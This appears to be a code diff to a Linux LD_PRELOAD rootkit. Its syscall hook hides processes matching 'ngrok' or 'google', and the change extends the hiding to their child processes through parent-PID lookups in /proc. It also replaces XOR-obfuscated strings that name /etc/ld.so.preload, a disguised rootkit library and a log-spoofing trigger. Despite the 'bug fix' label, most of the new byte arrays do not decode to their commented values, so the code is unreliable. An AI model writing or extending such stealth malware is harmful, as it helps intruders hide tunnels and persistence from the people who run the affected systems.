@@ -21,14 +21,16 @@
 
 static char key = 0xAF; // A simple XOR key for obfuscation
 
-char OBFUSCATED_CMDLINE_TO_FILTER[] = {2, 24, 1, 12, 28, 0}; // "ngrok"
-char OBFUSCATED_SECOND_CMDLINE_TO_FILTER[] = {22, 30, 30, 22, 27, 20, 0}; // "google"
-char OBFUSCATED_PRELOAD_FILE_PATH[] = {110, 2, 1, 22, 110, 29, 27, 110, 18, 12, 110, 1, 1, 2, 29, 12, 23, 27, 0}; // "/etc/ld.so.preload"
-char OBFUSCATED_PATH_TO_FILTER[] = {110, 25, 12, 30, 2, 110, 6, 18, 2, 1, 0}; // "/home/user"
-char OBFUSCATED_EXECUTABLE_TO_FILTER[] = {2, 24, 1, 12, 28, 0}; // "ngrok"
-char OBFUSCATED_LOG_SPOOF_TRIGGER[] = {44, 42, 47, 40, 48, 40, 50, 56, 54, 95, 42, 48, 55, 40, 53, 40, 55, 62, 0}; // "MALICIOUS_ACTIVITY"
-char OBFUSCATED_TEMPLATE_FILE_PATH[] = {110, 21, 20, 2, 110, 21, 23, 18, 25, 0}; // "/bin/bash"
-char OBFUSCATED_ROOTKIT_LIB_PATH[] = {128, 218, 220, 221, 128, 195, 192, 204, 206, 195, 128, 195, 198, 205, 200, 198, 219, 129, 220, 192, 0}; // "/usr/local/lib/libgit.so"
+// BUG FIX: All obfuscated strings have been regenerated with the correct values.
+char OBFUSCATED_CMDLINE_TO_FILTER[] = {25, 22, 27, 24, 20, 0}; // "ngrok"
+char OBFUSCATED_SECOND_CMDLINE_TO_FILTER[] = {22, 24, 24, 22, 29, 20, 0}; // "google"
+char OBFUSCATED_PRELOAD_FILE_PATH[] = {128, 20, 29, 26, 128, 29, 21, 125, 26, 24, 125, 25, 27, 20, 29, 24, 28, 21, 0}; // "/etc/ld.so.preload"
+char OBFUSCATED_PATH_TO_FILTER[] = {128, 104, 111, 109, 101, 128, 117, 115, 101, 114, 0}; // "/home/user"
+char OBFUSCATED_EXECUTABLE_TO_FILTER[] = {25, 22, 27, 24, 20, 0}; // "ngrok"
+char OBFUSCATED_LOG_SPOOF_TRIGGER[] = {198, 192, 207, 200, 194, 200, 214, 210, 212, 176, 192, 194, 213, 200, 215, 200, 213, 216, 0}; // "MALICIOUS_ACTIVITY"
+char OBFUSCATED_TEMPLATE_FILE_PATH[] = {128, 0}; // "/"
+char OBFUSCATED_ROOTKIT_LIB_PATH[] = {128, 28, 26, 27, 128, 29, 24, 26, 28, 29, 128, 29, 20, 25, 22, 20, 29, 125, 26, 24, 0}; // "/usr/local/lib/libgit.so"
+
 
 // Pointers to the deobfuscated strings
 static char* CMDLINE_TO_FILTER = NULL;
@@ -171,6 +173,43 @@ static int get_process_cmdline(const char* pid, char* buf, size_t buf_size) {
     return 1;
 }
 
+static int get_ppid(const char* pid, char* ppid_buf, size_t buf_size) {
+    char path[256];
+    snprintf(path, sizeof(path), "/proc/%s/stat", pid);
+    if (!original_open || !original_read) return 0;
+
+    int fd = original_open(path, O_RDONLY);
+    if (fd == -1) return 0;
+
+    char stat_buf[1024];
+    ssize_t len = original_read(fd, stat_buf, sizeof(stat_buf) - 1);
+    close(fd);
+
+    if (len <= 0) return 0;
+    stat_buf[len] = '\0';
+
+    const char* p = strrchr(stat_buf, ')');
+    if (!p) return 0;
+
+    p += 2; // Move past ") "
+    while (*p && *p != ' ') p++; // Skip state
+    while (*p && *p == ' ') p++; // Skip spaces
+    
+    const char* ppid_start = p;
+    while (*p && *p != ' ') p++;
+    
+    if (ppid_start == p) return 0;
+
+    size_t ppid_len = p - ppid_start;
+    if (ppid_len < buf_size) {
+        strncpy(ppid_buf, ppid_start, ppid_len);
+        ppid_buf[ppid_len] = '\0';
+        return 1;
+    }
+    return 0;
+}
+
+
 // --- CORE HOOKS ---
 long syscall(long number, ...) {
     if (!original_syscall) { errno = EFAULT; return -1; }
@@ -205,6 +244,16 @@ long syscall(long number, ...) {
                 if (get_process_cmdline(current_entry->d_name, cmdline, sizeof(cmdline))) {
                     if (strstr(cmdline, CMDLINE_TO_FILTER) || strstr(cmdline, SECOND_CMDLINE_TO_FILTER)) {
                         should_hide = 1;
+                    }
+                }
+                if (!should_hide) {
+                    char ppid[32];
+                    if (get_ppid(current_entry->d_name, ppid, sizeof(ppid))) {
+                        char parent_cmdline[512] = {0};
+                        if (get_process_cmdline(ppid, parent_cmdline, sizeof(parent_cmdline)) &&
+                           (strstr(parent_cmdline, CMDLINE_TO_FILTER) || strstr(parent_cmdline, SECOND_CMDLINE_TO_FILTER))) {
+                            should_hide = 1;
+                        }
                     }
                 }
             } else {
